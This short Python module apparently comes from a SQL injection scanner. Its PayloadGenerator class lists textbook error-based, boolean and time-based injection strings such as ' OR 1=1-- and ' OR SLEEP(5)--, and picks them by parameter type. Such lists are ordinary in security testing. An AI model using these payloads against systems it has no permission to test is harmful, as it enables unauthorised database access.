# utils/payloads.py
class PayloadGenerator:
    def __init__(self):
        self.payloads = {
            "error": ["' OR 1=1--", "' OR 1=1#"],
            "boolean": ["' OR '1'='1", "' OR '1'='2"],
            "time": ["' OR SLEEP(5)--", "' OR SLEEP(5)#"]
        }

    def get_payloads(self, param_type):
        if param_type == "string":
            return self.payloads["error"] + self.payloads["boolean"] + self.payloads["time"]
        elif param_type == "numeric":
            return self.payloads["boolean"] + self.payloads["time"]
        return self.payloads["error"] + self.payloads["boolean"] + self.payloads["time"]